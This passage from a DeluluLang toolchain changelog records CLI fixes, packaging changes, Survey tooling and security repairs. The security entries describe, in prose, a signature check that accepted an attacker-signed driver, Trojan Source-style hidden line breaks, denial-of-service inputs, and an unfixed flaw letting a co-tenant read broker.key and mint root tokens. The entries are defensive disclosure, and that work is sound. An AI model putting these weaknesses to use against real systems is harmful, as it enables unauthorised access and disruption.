  `let type = 41`, with both directions exiting 0. Under a morph the aliases **are** the keywords, so
  they are reserved; DL1715 now refuses it. The round-trip gate was replaced with a test of the
  identity law itself rather than an enumeration of remembered hazards.
- **The first spanned morph diagnostic crashed the CLI (C83/D83).** `delulu morph` rendered
  diagnostics against an empty `SourceMap` — safe only under an unstated, unenforced invariant that
  no morph diagnostic ever carried a span. Fixed at the call site, plus a defensive skip in both the
  human and JSON renderers; a repair that cannot be fully located is now dropped whole rather than
  emitted half-applied.
- **Six characters render as a line break and do not act as one (C89/D84).** VT, FF, NEL, U+2028,
  U+2029 and a lone CR let a `//` comment swallow the next *visible* line, so a reviewer saw a guard
  clause the compiler never compiled — Trojan Source inverted, and it survived `fmt --check`. Now
  DL0108, scanned over raw bytes beside the DL0107 rule. `\r\n` remains a normal line ending.
- **`delulu fix` filed an accepted widening as "changes nothing" (C90/D85).** `--accept-widening`
  promoted a widening repair to the plain `applied` verdict and printed "changes nothing about what
  this program may do", while the same tool's `--dry-run` correctly called it `widens-authority`. A
  distinct `applied-widening` verdict now reports it honestly. Not an escalation — a false record.
- **The normative exit-code table omitted a code the CLI uses (C91/D86).** `--assert-trace`
  violations exit `3`; `STABILITY.md` §1 listed only `0/1/2`.

### Added

- **`docs/QUESTIONS.md`** — hard questions answered with evidence: whether authority can be bypassed
  (leading with the C88 failure rather than burying it), how Authority and Guard compare with a
  sandbox and why you want both, what the mathematics does and does not prove, whether several
  agents can share one machine, whether plugins really work, whether the syntax can be changed, and
  the twelve things this project cannot claim.
- **DL0108** — line-break-like character in source.
- **DL1715** — the program uses one of the target morph's aliases as a name.
- **`prim::contains_on_disk`** — one fail-closed containment check shared by the interpreter and the
  WASM host, replacing two lexical prefix tests.

### Known — found, named, and NOT fixed (D87, D88)

- **Multi-tenancy is not provided (C92).** Several agents holding different authority on one machine
  require **separate OS accounts or containers**. Embedded mode isolates correctly and does so with
  DeluluLang's own check rather than the OS's; but with a *shared* broker state directory a
  co-tenant can enumerate the entire grant tree, revoke any node whose id it learns that way, and
  read `broker.key` — which is enough to mint a valid token for any node offline, including the
  operator's root. The source already scoped this out (`broker_transport.rs:5`); the documentation
  now says so wherever the question is asked.
- **Exponential type inference** on a small class of programs — 28 lines of nested record literals
  exhaust memory. **Quadratic type checking** in nesting depth — 16 KB of source takes 17.8 s.
  **Unbounded parser recursion** — ~150k nesting levels overflow the stack and exit outside the
  `0/1/2/3` contract with no diagnostic and no `--json` envelope. `delulu check` is the agent hot
  loop, so these are denial-of-service surfaces against the intended workflow. A bound is
  language-visible and belongs in an RFC, not a hardening pass.

> **Why this file starts at 1.0.0 rather than 0.1.0.** DeluluLang was built stage by stage against
> per-stage specifications, and the per-stage build orders are the authoritative history of that work
> — they record not just what changed but what was ruled and why. This changelog begins where the
> language became something outsiders could depend on, and does not attempt to retrofit ten stages of
> internal history into release notes it never had.

---

## [Unreleased] — production-hardening campaign

The hardening campaign (commissioned 2026-07-24) pressure-tests every stage to failure and fixes what
breaks. Nothing here is released; entries land as each phase completes. Full findings ledger:
`docs/design/HARDENING_CAMPAIGN.md`.

### Added

- **`docs/release/CHECKPOINT-1.0.md`** (D71) — the state of the project beside the gate that shipped
  it: architecture and why two odd-looking dependencies are deliberate, the Survey, the compiler, the
  runtime and exactly how much of it the WASM backend covers, the CLI, the package ecosystem, the
  testing surface, ten known limitations stated without softening, and a roadmap ordered by what
  would most change the language's usefulness. Every figure is either recounted from the tree by a
  gated Survey fact or taken from a named suite run.

### Added

- **The toolchain can now be distributed.** `scripts/package-toolchain.sh` produces a self-contained
  per-platform archive — binary, `LICENSE`, `NOTICE`, `TRADEMARK.md`, examples (files *and* package
  directories) and a `SHA256SUMS` generated from the staged tree, so the manifest describes what is
  actually inside rather than what was intended. Verified the only way that means anything: **unpacked
  into a directory sharing nothing with the workspace and driven with no cargo, no source tree and no
  Rust toolchain** — 8/8 front-door steps on Windows and on Linux, checksums verifying, the `DL0703`
  refusal naming the exact flag that would resolve it, and a package *directory* running.

  **The shipped binary is the `--no-default-features` build, and that is load-bearing.** A default
  release build embeds CPython through `pyo3` and imports a **specific** interpreter — `python313.dll`
  on the machine this was written on. Not "Python", that build; anyone without that exact version gets
  a loader error before `main`, where no diagnostic of ours can reach them. Measured rather than
  assumed: the default binary carries that import string and the portable one carries none. In the
  shipped build `root.python(...)` returns `DL1307` (unavailable) — the same behaviour as a machine
  with no interpreter, reported instead of crashed.

  `INSTALL.md` states all three paths, including the one that **deliberately does not exist**:
  `cargo install delulu` from crates.io cannot work while every crate but the CLI is `publish = false`,
  and `STABILITY.md` §2 promises those crates are not a stable interface. Publishing them would trade a
  written promise for a shorter command. Gated by `crates/delulu/tests/distribution.rs`, which checks
  that `INSTALL.md` and the archive's own `INSTALL.txt` teach the *same* commands, that both show the
  refusal, that the packaging script keeps the portable flag and the licence files, and that no
  document promises the crates.io path. README no longer says "there is no download" — it says
  nothing is *hosted*, which is the true statement.

- **The Survey answers machines.** Every read-only verb — `query`, `rdeps`, `impact`, `affected-by`,
  `findings`, `check` — now takes `--json` and emits **one object** carrying `tool`, `verb` and
  `schema`. The map every maintainer consults before changing anything existed **only as prose**,
  which made one of its two channels second-class. `--json` is not a feature for machines any more
  than the human render is a feature for humans: a person writing a CI check needs the structured
  answer, and an agent debugging a bad edge reads the prose. Both channels are first-class because
  **any maintainer may use either** — the same no-discrimination rule the language applies to the
  parties holding its grants. **Every edge and every
  hop keeps its `via: {kind, file, line}` citation**, so the provenance law holds in the machine
  channel exactly as in the human one: an agent can disagree with any single hop by opening the file
  it names. `query --json` always carries `entrenched` — `null` for an ordinary node rather than
  omitted, because a missing field cannot be told apart from "this tool did not answer". The JSON
  walk is **uncapped**; only the human render truncates.

### Fixed

- **`delulu doctor --json` emitted TWO objects on any run that reported a problem.** It printed its
  envelope without recording the emission, so the nonzero exit made the CLI add its documented
  fallback envelope on top — breaking the one-object contract precisely when a caller had asked a
  machine question and got a real answer back. Now recorded before the exit code is decided.

- **The contract gate could not see a command nobody had written down.** It verified that every
  *named* subcommand appears in `--help`, and never the reverse — so `doctor`, which is dispatched
  and documented but listed in neither the swept nor the excluded set, was reached by no sweep at
  all. The gate now **reads the dispatch `match` in `cli.rs`** and fails on any arm missing from both
  lists. This is the campaign's recurring shape for the eighth time: a hand-maintained list falls
  behind the thing that defines it, so the definition has to be read rather than mirrored.

- **`delulu-survey` accepted `--json` and ignored it**, answering with prose and exit 0 — the exact
  defect the main CLI closed as C76 (*"an option nobody understood is refused, never ignored"*),
  surviving in a sibling binary written before the lesson. Unknown options are now refused with exit
  2 and named. A tool whose audience is machines is the worst place to silently drop a flag: a human
  notices prose where JSON should be, a pipeline does not.

### Changed

- **Lint findings reduced — and the way they were counted corrected.** The number published for
  months was produced by a `grep` that also matched cargo's **per-crate summary lines**
  (``warning: `delulu-wasm` (lib) generated 1 warning``), which are not findings; and a *warm*
  `cargo clippy` does not re-emit warnings for units it did not re-lint, so the same tree measured
  26 and then 42 within the hour. A clippy count is only meaningful **measured cold, in an isolated
  target dir, with summary lines excluded**. Measured that way on one machine, real findings went
  **34 → 14** on Windows and to **15** on Linux, by converging on the initializer form the tree had
  already chosen (`Grants { console: true, ..Default::default() }`) at 12 sites, all test-only.
  **None of them was ever a `clippy::correctness` lint** — they are style and complexity
  suggestions, so the count was never evidence of a bug.

  What remains is left deliberately: AST variant sizes that boxing would churn every construction
  site to change, a deliberately named `eq`, argument counts on functions whose parameters genuinely
  travel together, and a **static guard** clippy reads as a constant assertion — it is the assertion
  that proves the explain-coverage test can fail. The count is watched for *movement*, not zero.

  Two things worth recording. The auto-fix deleted the comment in `main.rs` explaining why a worker
  panic maps to exit 2 — the mapping campaign finding C49 turned on — and it has been restored with
  that reason written into it; a tool that optimises code shape does not know which comments are
  load-bearing. And the baseline is **per-platform**: macOS would be a third number, and no one has
  ever seen it.

### Fixed

- **No command silently ignores an option any more** (C76, D73). Twelve of twenty-two subcommands
  accepted a flag that cannot exist and exited **0** — `check`, `authority`, `why`, `atlas`,
  `explain`, `run`, `build`, `lock`, `test`, `secrets`, `locale`, `morph`. `delulu check
  app.delulu --strict` printed `checked clean` having never heard of `--strict`.

  A second position, same defect: a flag that takes a value and is given none was dropped, and the
  command ran on its default. `delulu run app.delulu --grant console --isolation` **executed with no
  isolation at all** and reported success.

  A person may notice a missing effect. **An agent assembling a command from a half-remembered flag
  name gets a green light for work that never happened**, and this language's stated primary users
  are agents. Both are refused now, and two sweeps over the whole CLI surface hold the line —
  because a rule applied at each site is a rule the next site forgets.

- **`delulu audit` no longer reads the wrong store when you mistype a flag** (C75, D72). `audit`
  takes `--dir`; every sibling custody command (`grants`, `guard`, `secrets`) takes `--state-dir`.
  The parser silently dropped anything it did not recognise, so an operator typing the habitual flag
  got records from the default `~/.delulu/audit` **printed as the answer to a question about a
  different store**. Investigating an incident with evidence from somewhere else is not a lesser
  failure than showing none. Unknown options are refused, and `--state-dir` gets a note explaining
  why this command differs: it reads files, its siblings talk to the broker.

- **`delulu secrets list` says when the store is empty** (C74, D72). It printed nothing at all and
  exited 0, so a reader could not tell *there are no secrets* from *the store could not be read*
  from *the command did nothing* — about a security store. On stderr, so stdout stays a clean,
  pipeable list of names.

- **`delulu fix` refuses a file it cannot repair** (C73, D72). `fix notes.txt` printed
  `nothing to repair` and exited 0 while `check` on the same bytes gave `DL0204`. The refusal is
  deliberately not worded "nothing to repair" — that is the success line for a clean source file,
  and reusing it is how the two outcomes became indistinguishable.

- **`delulu new` refuses a package name that only works on your platform** (C72, D72). `delulu new
  con` succeeded on Linux and macOS and produced a directory Windows can never check out — `git
  clone` fails on the directory itself. On Windows it failed already, with two different raw OS
  errors for one cause. Reserved device names (`con`, `aux`, `nul`, `prn`, `com1`–`com9`,
  `lpt1`–`lpt9`) are now refused on **every** platform; names that merely contain them, like
  `console` and `context`, are untouched.

- **The reference's grammar index now reaches the grammar** (C71, D70). Each production publishes a
  `ref.grammar.<name>` anchor that conformance witnesses cite. Those names follow `parser.rs`; the
  normative EBNF in the stage specifications uses fuller spellings, and six of twenty-seven diverge.
  `ref.grammar.args` had both witnesses and a `parse_args` behind it while **no specification defined
  anything called `args`** — a reader following the reference to the grammar found nothing.

  All six were in fact documented under other names (`call` for `args`, `effect_row` for `opt_row`,
  and four `_decl`/`_expr` spellings), so nothing was missing; only the path was broken. The chapter
  gains a **Defined as** column, says plainly that it is an index rather than the grammar, and a test
  checks the correspondence in three directions.

- **Three statements that had outlived their facts** (D70): `STAGE2_SPECIFICATION.md` said
  `delulu authority <dir>` still uses the single-package loader (closed by D45a) and that CI is
  Windows-only (the workflow declares three OSes — and has never executed);
  `STAGE6_BUILD_ORDER.md` deviation 3 still refuses multi-module plugin packages, correctly, but its
  stated blocker has existed since D61; and `ci.yml` promised to flip the coverage gate "at the 1.0
  cut", which happened in the test suite instead, where it is stronger.

### Changed

- **Only the CLI is publishable to crates.io** (D69). `STABILITY.md` §2 has always said the Rust
  crates are an implementation detail and not a stable interface; twelve of thirteen nonetheless
  defaulted to publishable at `1.0.0`, so a single `cargo publish -p delulu-check` would have minted
  a semver contract over seventeen modules the document disclaims. Every crate but `delulu` now sets
  `publish = false`, and a gate refuses a new one that does not.

  Nothing you can do today changes: the project is not distributed, and the CLI could not be
  published even on purpose — its path dependencies carry no version numbers, so `cargo publish`
  refuses it. The CLI is left publishable because it is the only crate that could ever *be* the
  distributed artifact. This gate prevents an accident; it does not preserve an install path.

- **`[package.metadata.delulu] surface` says whether a crate is the language or repository tooling**
  (D69), because `publish` was answering that question too and the two need opposite answers. The
  separation immediately corrected a published number: the shipped-crate count had been derived as
  "thirteen minus the unpublishable ones" and labelled "language crates", which was true only while
  one crate happened to be both. Asked directly, the tree says **nine** language crates and four that
  measure or map this repository. README says nine.

- **`delulu run` lives in its own module** (D69). `cli.rs` was 8,856 lines and `cmd_run` was 945 of
  them. The coupling was measured before the cut — the subsystem reaches 24 of 143 top-level items,
  sixteen of which are its own helpers — and shared helpers deliberately stayed put rather than being
  given a false owner. `cli.rs` is now 7,740 lines. The core-invariance snapshot passed
  byte-identical and was not re-blessed, which is the whole proof that nothing moved but bytes.

### Added

- **The Survey answers "may I change this?"** (D68). A handful of paths are entrenched by
  Constitution §10 — the constitution itself, `STABILITY.md`, `/rfcs/`, the soundness audit, the
  conformance machinery — and `delulu-survey query` now says so before printing a single edge,
  citing the `.github/CODEOWNERS` line it read. The owner string is carried verbatim; the map has no
  opinion about who a handle is.

  The `*` catch-all is deliberately ignored, because a rule matching every path separates nothing.
  A rule matching **no** path is an error: renaming an entrenched file silently un-entrenches it,
  and a rule guarding nothing reads in a diff exactly like a rule guarding something.

- **`delulu_runtime::on_interpreter_thread`** (D68) runs a closure on a thread sized for the
  interpreter's depth bound, so an embedder gets `DL0905` instead of a stack overflow without having
  to know what a tree-walking interpreter costs per call. C21's residual was never a missing
  mechanism — it was that using the mechanism correctly required knowing a number.

- **Stage 6, 7 and 8 decisions are citable** (D68). Those stages recorded real rulings, but three
  stages each number from 1, so a Stage-6 decision could not be cited the way a Stage-9 one can. A
  ruling index in each build order names every existing entry as `S6-D1`…, `S7-D1`…, `S8-D1`… .
  Nothing was renamed and no text moved.

### Fixed

- **A Unix socket path the kernel cannot hold is refused by name** (D68). `sun_path` is **104 bytes
  on macOS against 108 on Linux**, and macOS temp directories are long enough that a state directory
  that is comfortable on Linux lands close to the ceiling there. The bind would have surfaced
  `ENAMETOOLONG` — "File name too long", with no number, no limit, and no hint that the platform is
  the variable. It now names both figures and the remedy. Tested on Linux, where the branch
  compiles; the constant for macOS is reasoned, and no Mac has run it.

- **Recursion inside an actor behavior is a diagnostic again, not a process abort** (C70, D67).
  `ref.rule.runtime.faults-are-diagnostics` promises that a runtime fault — including recursion depth
  — is *"a diagnostic with a code, never a host crash"*. On the actor path it was not. The same
  function at the same depth printed its answer from `fn main` and killed the process from inside a
  behavior: on Windows, above depth **43** in a debug build and between **300** and **400** in
  release, against a documented bound of **10,000**.

  The CLI reserves a large stack so the interpreter's own bound is what fires. That reservation
  belongs to one thread, and the actor scheduler — which runs the very same interpreter on its own
  workers — set no stack size at all. Actor workers now reserve the same budget, and their depth
  bound is sized to whatever stack they actually got: **the pair is the invariant**, because a bigger
  stack alone only moves the crash deeper and a smaller stack with an unchanged bound *is* the crash.

  The budget now lives in `delulu-runtime` next to the bound it pays for, so there is one definition
  and both threads read it. A source-scanning gate fails unless every thread-creation site in the
  tree either sizes its stack or is listed as never running a program, with its reason — and it fails
  the other way too, so an exemption cannot outlive its fact.

  **Two things worth knowing about how this hid.** The existing witness for the rule was correct and
  passing — it recurses in `main`, the one thread where the rule already held. And a stack overflow
  prints no `panicked at`, so every no-panic sweep in the tree was structurally blind to it.

- **The stack the toolchain reserves and the stack it advises now agree** (D67). `main.rs` reserved
  512 MiB while the published embedder budget was 80 KiB × 10,000 = 800 MiB. Nothing crashed, because
  512 MiB covers the measured per-frame cost — but the toolchain was giving itself less than it told
  embedders to take, and the first code to compare the two computed a bound of 6,550 for the CLI's
  own thread. The reservation is now derived from the published budget. It is virtual memory; a
  program that never recurses pays nothing for the difference.

### Security

- **The decision that started a machine is now recorded, not only printed.** A run that spawned a
  hardware driver announced its provenance verdict on stderr and nowhere else, so afterwards nothing
  answered the one question an incident asks: *which key signed the driver that moved the machine?*

  `--adapter-record <dir>` appends the decision to the broker's **existing** hash-chained audit log
  as `adapter.provenance`, carrying the artifact, the verdict, the signer's key and the pinned key —
  so `delulu audit verify|tail|query` already reads it. No second format was invented: two records of
  one machine is how two records come to disagree.

  **Refusals are recorded too, and that is the load-bearing half** — a run stopped because the driver
  was signed by the wrong key is precisely the event worth keeping, so the record is written *before*
  the refusal is acted on. A named sink that cannot be written **refuses the run**: a record you
  asked for and did not get is worse than none, because you would believe you had it.

  **There is no default sink, and the reason was learned the hard way.** A hash chain has exactly one
  writer; the broker is one process and satisfies that, but `delulu run` is short-lived and many can
  run at once. The first version defaulted to the shared audit directory, and the parallel test suite
  produced a chain that failed its own verifier with interleaved half-lines. Filed as C69 rather than
  quietly corrected. (D66, closing C60 and C69)

- **A driver signature that verified under an attacker's key satisfied the strongest flag there was.**
  `verify_detached` reads the public key out of the first 32 bytes of the signature file it is
  checking, and the `.sig` sits beside the driver — so anyone able to overwrite `drive.exe` could
  overwrite `drive.exe.sig` with one they had signed a second earlier, and `--require-signed-adapter`
  accepted it. The check answered "did somebody sign this?" while its name promised something else.
  The witness plays the attack out before pinning anything, so the hole is recorded as observed
  behaviour.

  **`--adapter-signer <hex>` pins the key**: a signature that verifies under any other key is DL1510 —
  the "wrong-key" case the code's own text always claimed to cover, and never did, because nothing
  compared the signer to anything. Pinning implies the signature is required. **`--adapter-artifact
  <path>` names which bytes carry the provenance**, because refusing to verify an interpreter (D52,
  correctly) had left `--require-signed-adapter` unusable for every script-hosted driver — a control
  nobody can switch on is not a control. And an unpinned verify now says what it does *not* mean.

  Still true, and stated wherever the gate is: this is an operator-supplied subprocess, not spec
  §5.4's Verified-class signed plugin; signing buys **provenance**, not behaviour; unpinned there is
  no trust policy at all; and the verdict is **printed, not recorded** — there is no durable evidence
  of which key signed the driver that drove the machine (finding C60, open). (D53)

- **A hardware driver's provenance is checked before it is spawned.** The adapter shipped as an
  operator-supplied subprocess with **no signature check** — named honestly as a gap, but a gap: the
  envelope bounds what a driver may be *asked* to do and says nothing about where the driver came from.
  Now a signature present beside the driver that **does not verify refuses the run regardless of
  policy** (DL1510, the rule Stage 6 already made for plugins); an absent signature is disclosed loudly
  and refusable with `--require-signed-adapter` (DL1511); and when `--adapter-cmd`'s first token is not
  a readable file — an interpreter-hosted driver names the *interpreter*, not the driver — the run says
  it could not check rather than passing silently, because a gate that looks checked and isn't is worse
  than no gate.

  Still true, and stated wherever the gate is: this is an operator-supplied subprocess, not spec §5.4's
  Verified-class signed plugin. Signing buys **provenance**, not behaviour. (D52)
- **A cyclic type alias no longer crashes the compiler.** `type A = A` plus a single use of `A` aborted
  the process with a stack overflow (`0xC00000FD`), as did `type A = B; type B = A`, `type A = List[A]`,
  `type A = iso A` and `type A = fn(A) -> Int` — a hard crash from three lines of ordinary source, and
  a denial of service for anything that compiles code it did not write. Cycles are now detected before
  any type is lowered and refused at the declaration with **DL0304**, naming the chain; the expansion
  path additionally refuses to recurse, so the crash is structurally impossible rather than merely
  diagnosed. Recursive records and sums stay legal — those are nominal and are never expanded.

  This corrects an earlier verdict rather than quietly superseding it: cyclic aliases had been recorded
  as a hygiene issue on the evidence that long terminating chains resolve and that secrets cannot
  launder through a cycle. Both remain true; what was never tested was a cycle that is actually *used*.
  (C54/C16, ruling D47a)
- **A `delulu.lock` can no longer misstate what a dependency does.** `build --locked` recomputed the
  content and authority hashes and compared them to the stored ones — but never checked the recorded
  `effects`, `cap_kinds`, `secrets` or scope lists, which are the fields a human opens a lockfile to
  read. A lockfile could claim a dependency has no effects and no capabilities while that dependency
  genuinely reaches the network, and the locked build printed **"built clean"**. `authority --diff` on
  the very same file reported `verdict: WIDENING`: the interactive review command caught what the
  automated CI gate did not.

  Now the recorded authority and version are compared against reality (DL1002), a duplicated entry is
  refused rather than resolved (DL1011), and a lock format version this toolchain cannot read pins
  nothing instead of being interpreted as version 1 (DL1011) — the same rule as an unverifiable
  signature algorithm. A fifteen-case tampering matrix went from 15 accepted to 2, both remaining ones
  named and reasoned. This is a review-integrity fix, not an authority escalation: the manifest pin
  bounds a dependency independently of the lockfile. (C52, ruling D45b)
- **An unreadable `delulu.toml` no longer crashes the build, and the crash gate can now see crashes
  at all.** An empty manifest — the most ordinary beginner mistake there is — made `delulu build` and
  `delulu check` panic, along with four other manifest shapes, while `lock` and `authority` diagnosed
  every one of them correctly. The diagnostic (DL1004) was always computed; the crash was in a
  *courtesy note* added by an earlier fix in this campaign (C26), which reached for the root package's
  directory in the one situation where resolution never recorded a root package.

  The larger repair is to the gate: the CLI runs on a worker thread with a 512 MiB stack, and `main`
  maps a worker panic to exit **2** ("internal") — deliberate, documented, and correct. But the
  no-panic sweep keyed on exit 101, so it was structurally blind to every crash in the path where all
  the work happens. Both sweeps now detect the panic message itself. (C49, ruling D44c)
- **`delulu authority` no longer reports a package as clean when it cannot read its manifest.** The
  review surface — the one command whose product is "what this program can do to your system" —
  printed a confident report with `diagnostics: []`, `summary: {errors: 0}` and exit 0 for a package
  `check` refuses with DL1004, byte-identical to the report for a well-formed manifest. A present
  manifest is now parsed and its diagnostics reported; an absent one is still fine, because
  `authority` accepts a plain directory of modules. (C50, ruling D44d)
- **A device envelope can no longer bound nothing while looking like a bound.** Both runtime envelope
  parsers accepted non-finite bounds, so `angle_deg=-inf..inf` admitted every command and
  `kernel_ms=0..inf` satisfied a *mandatory* term whose stated purpose is preventing "a kernel with no
  time budget [that] can occupy the device forever". The broker had refused non-finite bounds since
  D12e and documents that refusal as load-bearing; the machine is moved from the runtime side. (C41,
  ruling D43c)
- **A term stated twice in a device grant is refused, not resolved — and the two parsers no longer
  disagree about which one wins.** `delulu-broker` kept the last occurrence and the runtime kept the
  first, so `angle_deg=-30..95,angle_deg=-1..1` meant `[-1, 1]` to the recorded authority and
  `[-30, 95]` to the code that moves the machine: **appending a tighter bound recorded a tightening it
  did not apply.** The two parsers for this grammar are now pinned by a bidirectional law over a corpus
  that includes the hostile shapes — the previous law was one-directional over four well-formed specs
  and could see none of this. (C40/C43, ruling D43b/D43e)
- **A simulation can now run out of time.** Under the stepped clock (`--sim-step`), a program whose
  every command was refused froze simulated time and held its device indefinitely, because the
  interpreter refuses an out-of-envelope command before the broker — the only thing that advances that
  clock — is reached. The identical program and grant on the wall clock lost the device to the
  watchdog. Since **DL1905 refuses hardware without an approved simulation of those exact bytes**, the
  one environment that authorizes hardware could not rehearse a revocation hardware would produce, for
  exactly the fault class a dead-man exists to answer. A refused attempt now costs the simulated time
  the wall clock charges for free. **The dead-man itself is unchanged**: the same code decides when a
  lease dies, the wall-clock watchdog is untouched, and a refused command still does not *beat* a
  lease. (C39, ruling D43a)
- **A device grant's `fail=` must name one of `hold`, `coast`, `safe-park`.** The broker accepted any
  string, including empty, while the runtime accepted three — so `fail=hodl` produced a valid grant that
  no program could ever mint, and an operator met the typo when a robot tried to move rather than at
  delegation. One canonical list now lives in the lower crate. (C42, ruling D43d)

  **Compatibility:** device grant strings with a non-finite bound, a repeated term, or an unrecognized
  `fail=` state previously parsed on at least one side and now error on both. Nothing in-tree was
  affected.
- **Trojan Source is refused.** Raw Unicode bidirectional control characters in source are now a hard
  error, **DL0107** — the class of attack (CVE-2021-42574) where rendered text and compiled text
  disagree. The scan runs over raw bytes ahead of tokenizing, so the `\u{202e}` *escape* remains legal
  (it is visible in review) and right-to-left *letters* are untouched (no i18n regression). (C6/P2,
  ruling D26)
- **The supply chain can no longer widen secret scope quietly.** A dependency that began reading a new
  secret on a patch bump was waved through: `root.secret("X")` adds no effect and no capability kind,
  only a name, and the lock entry never stored secret names. Lock entries now carry `secrets`, and both
  `authority_widened` and `authority --diff` see them. Deliberately *not* folded into `authority_hash`,
  which would have invalidated every existing lockfile — a format break is owner-reserved. (C18,
  ruling D28)
- **Builtin type and effect names are reserved.** All 16 builtin type names (including `Root`, `Cap`,
  `Secret`, `Plugin`) and all 10 core effect names could be redeclared by user code, and every such
  declaration was silently **inert** — `effect Write` left every `! {Write}` meaning the real,
  filesystem-reaching `Write`. Now **DL0302** at the definition site, enforced on all three
  declaration-table paths. (C23, ruling D30)
- **The manifest ceiling and the dependency pin now bound secrets.** A package could read any secret
  while declaring none (**DL1009** was effects-only), and a consumer's `secrets` pin constrained
  nothing at all — `scope_violations` checked effects, `fs`, and `net`, never secrets, so the pin was
  decoration (**DL1001**). A secret read is invisible to the coarser dimensions, which is why this
  survived: `root.secret("X")` contributes no effect and no capability kind, only a name. Completes
  invariant 10 for the secret dimension. (C19, ruling D34)

  **Compatibility:** a package reading an undeclared secret, or a pin omitting a dependency's secrets,
  previously checked clean and now errors. Nothing in-tree was affected; downstream trees will see new
  errors, which is the point of the rule.

### Added

- **The Survey answers the transitive questions — `impact`, `affected-by`, `path` — and refuses to
  compose relations that do not compose.** `rdeps` is one hop. That is the right answer to "what
  points at this" and the wrong answer to "what breaks if I change this":
  `mod:crates/delulu-check/src/check.rs`, the module that decides what type-checks, has **one
  structural** edge arriving at it and reaches **134** nodes transitively. The Survey's own README tells a reader to
  reach for `rdeps` first when changing anything, so the primary documented use case was returning
  a confident number that understated blast radius by two orders of magnitude.

  `impact <id>` walks it, `affected-by <id>` is the same walk outward, `path <a> <b>` prints one
  chain in full, and `--depth N` bounds the first two. **Every hop names the node it came from and
  the file and line the relation was read from** — the provenance law does not weaken over
  distance, and a chain that could not be cited at every step would not be admissible here.

  **The first version was wrong, and measuring it is what showed that.** Composing every edge kind
  reported **236 nodes reachable from every starting node in the repository**, including
  `doc:README.md` — 236 things that "break" if a README changes. Narrative edges connect everything
  to everything eventually: `README links-to CONTRIBUTING` followed by `CONTRIBUTING references
  cli.rs` is two unrelated sentences laid end to end, and calling their composition "what breaks"
  asserts a relation no file in this repository states. Every individual edge was cited and true;
  the *path* was not. A walk now follows only relations that propagate — crate dependencies, module
  declarations, use-sites, test targets — and `EdgeKind::composes` is exhaustive, so a new edge kind
  cannot compile until someone decides which side it is on. The blast-radius numbers now order the
  way a dependency graph must: `delulu-diag` 164 > `delulu-syntax` 148 > `check.rs` 134 >
  `delulu` 62, and a diagnostic code and a document correctly reach **0**.

  **Two proposed verbs were disproved by inspection rather than built.** `why <id>` would print a
  filtered subset of what `query` already returns — the incoming `cites`/`links-to`/`documents`
  edges from rulings, findings and specs are already in its output. `owners <id>` would read
  `.github/CODEOWNERS`, where every rule names the same deliberate placeholder
  (`@PENDING-PUBLIC-project-lead`, unassigned until public launch), making it a constant function.
  Both are recorded in `docs/survey/README.md` under what the Survey will not do, with the one
  thing CODEOWNERS carries that the map does not — which paths are **entrenched** — named as
  unbuilt rather than quietly dropped.

- **`delulu check` takes several files in one process — and the argument it used to drop in silence
  is now refused.** Every performance table this project publishes measures the *marginal* cost of
  size. None measured the **floor**: what one invocation costs on a program small enough to be free.
  That floor is what an AI agent pays on every edit→check iteration, and
  [`measurements/agent-loop/RECORD.md`](measurements/agent-loop/RECORD.md) finds it dominates
  everything else.

  On a 35-line file, **26.9 of 32.8 ms — 82% — is Windows creating a process**, before a byte of
  DeluluLang runs; on Linux the share is 46%. The compiler's own work is under 1.5 ms on both. A
  program must reach roughly **2,080 lines on Windows** (270 on Linux) before compiling it costs as
  much as starting the process. Making the checker twice as fast would save 1.2% of a Windows loop.
  The lever is the number of processes, so twenty files in one invocation now cost **48 ms against
  711** on Windows (**14.8×**) and 14.2 against 119 on Linux (**8.4×**). Nothing was made faster.

  Two hypotheses were killed by controls rather than argued away: the embedded CPython accounts for
  1–3 ms (real, small, and not why the floor is 26.9 ms — a binary containing no DeluluLang at all
  costs that), and `main.rs`'s 512 MiB interpreter stack costs 0.5–0.7 ms, below the spread of the
  control, which is the first evidence for a docstring that has claimed it "costs nothing" since
  Study C.

  **The correctness half is the part worth remembering.** Asking whether one process could do
  several files turned up something worse than a missing feature: the parser kept the first non-flag
  argument and dropped the rest **in silence**. `delulu check a.delulu bad.delulu` printed
  `ok: a.delulu checked clean` and exited **0** while `bad.delulu` — never opened — held two errors;
  a shell glob did the same. Observed against the unmodified binary before anything changed. `check`
  now checks them all and names every file including the clean ones; `authority`, `run`, `why`,
  `build`, `lock` and the three `plugin` verbs refuse a second path rather than ignoring it. One
  file behaves exactly as it always did — pinned across all 108 shipped targets by the
  core-invariance snapshot, which caught nothing here because nothing moved.

- **The core's answers are now pinned, so tooling built around the language cannot move the
  language.** Everything added after 1.0 — the language server, `fix`, `new`, `completions`,
  `add --path`, the Survey, the code dispositions — exists for the people and agents who *build*
  DeluluLang. The language is what everyone else depends on, and a green suite does not protect it:
  a passing test proves the assertions someone wrote still hold, not that the compiler still
  decides the same things about real programs.

  `tests/core-invariance/SNAPSHOT.txt` records the exact bytes the toolchain produces for all
  **108 targets** the repository ships — every `.delulu` module under `examples/`,
  `tests/conformance/` and `tests/corpus/`, plus the seven package directories, across **360
  cases**: `check`, `check --json`, `authority`, `authority --json` and `why`. Any change to what
  the compiler says about a shipped program becomes a diff in a reviewed file.

  **This catches what the coverage law cannot.** The conformance law pins each diagnostic *code*;
  every existing assertion about DL0106, for instance, is `x.code == "DL0106"`. Changing one word
  of that diagnostic's message in `delulu-syntax/src/parser.rs` was **observed** to leave the whole
  pre-existing suite green and to be caught by this gate alone, which named the two affected cases
  and printed recorded-vs-current. Package targets carry the most: the tier-4 diamond pins seven
  merged module rows, three capability scopes, eleven pure functions, and the cross-package
  provenance chain `main → handle → record (dep:archive/…)` for `Write`.

  Deterministic surfaces only — `run` reaches the clock, the random source and the filesystem, and
  a gate that is flaky is a gate that gets deleted. Paths are passed forward-slash so the CLI
  echoes them back identically on all three platforms; the recorded file contains no absolute path,
  no separator and no host name. Blessing is explicit (`DELULU_BLESS=1`), never automatic.

- **`delulu add --path <dir>` — a dependency whose authority pin is computed, not guessed.** With
  no hosted registry, a real dependency today is a directory beside yours, and declaring one meant
  hand-writing `{ path = …, authority = { effects = […] } }` and guessing the pin — then learning
  the right value by reading DL1001. The toolchain already knew it: the pin written is exactly what
  `delulu authority <dir>` reports and exactly what `delulu publish` stamps into an index line. One
  notion of what a package can do, used everywhere.

  **It will not grant authority on your behalf.** A pure dependency is added outright — there is no
  decision to make, because the package cannot do anything. A dependency that needs an effect is
  *shown and refused*, with the exact accepting command printed; `--accept-authority` writes the
  pin. Adding a dependency is the moment a supply chain acquires new authority, and a tool that
  quietly widened a manifest at that moment would be doing the one thing this language exists to
